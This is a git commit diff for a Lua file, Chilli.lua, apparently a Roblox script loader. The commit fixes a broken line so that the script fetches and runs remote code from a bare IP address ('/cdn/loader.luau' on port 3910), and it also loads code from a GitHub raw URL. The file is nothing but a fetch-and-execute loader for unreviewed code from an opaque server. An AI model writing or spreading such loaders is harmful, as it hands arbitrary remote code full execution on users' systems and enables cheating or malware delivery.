3da11860a64ac3e3c7d4dd43cfba5d10e5d9ef91
Silentx <silentxvn@gmail.com>
2025-11-03 16:42:09 +0700

    Update URL for loading Chilli.lua

--- Chilli.lua
+++ Chilli.lua
@@ -1,4 +1,4 @@
 ID="9cf507ca-e866-4299-9303-1bb7cee4af2e";
 RUN_AFTER=loadstring(game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua"));
 
-loadstring(game:HttpGet("loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
+loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/loader.luau"))()
